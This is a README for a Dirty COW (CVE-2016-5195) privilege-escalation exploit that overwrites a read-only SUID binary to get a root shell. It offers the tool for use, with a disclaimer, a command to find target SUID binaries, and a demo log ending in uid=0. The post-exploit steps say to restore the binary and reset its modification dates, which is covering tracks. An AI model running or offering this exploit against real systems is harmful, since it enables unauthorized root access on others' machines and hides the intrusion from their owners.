# Disclaimer
I am not  responsible for anything you do with this code. This code comes with no warranty.

# Description
Exploit for CVE-2016-5195 which maps a readonly SUID executable to memory (readonly) and
uses the race condition to overwrite it with an ELF of our choice. Payloads
are available in NASM format alongside the exploit code(cowshell-x86.asm && cowshell-x86_64.asm) if
you wish to see what's inside `cashm0ney`.

Payload elevates with `setuid(0)`, places `0` in `vm.dirty_writeback_centisecs`
to prevent the crash due to filesystem writeback, and pops a shell(`/bin/sh`). 
This version does not attempt to write to `/proc/self/mem`, so it should
be viable on CentOS/RHEL boxes. Still relies on ptrace, so it may fail if ptrace
is restricted on the target system.
# Pre-Exploit
Find a SUID executable that your current user has at least read access to:

`find / -type f -perm 4755`

# Demo
<pre>
meow@dirtytest:~/Desktop$ ./derpyc0w /bin/ping /tmp/ping
[*] Opened /bin/ping
[*] Backing up /bin/ping to /tmp/ping
[*] File mapped at 0x0x7f0cbe7ce000
[*] Waiting for child to alert
[*] Starting madvise thread.
[*] Alerted by child.
[*] Preparing to write 262 bytes
[*] Trying to perform writes.
[*] Wrote byte to 0
[*] Wrote byte to 1
[*] Wrote byte to 2
[*] Wrote byte to 3
[*] Wrote byte to 4
[*] Wrote byte to 5
[*] Wrote byte to 6
[*] Wrote byte to 7
[*] Wrote byte to 8
SNIP
[*] Wrote byte to 259
[*] Wrote byte to 260
[*] Wrote byte to 261
[+] w00t, writes finished
[+] Popping shell. Remember to restore /bin/ping from /tmp/ping with correct perms!
# id
uid=0(root) gid=1000(meow) groups=1000(meow),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),131(sambashare)
# 

</pre>

# Post-Exploit
You should restore the binary which got overwritten to it's original path from the backup that was created, and remember to chown && chmod it back to the correct ownership and permissions. Touch the modification dates back for the trifecta. 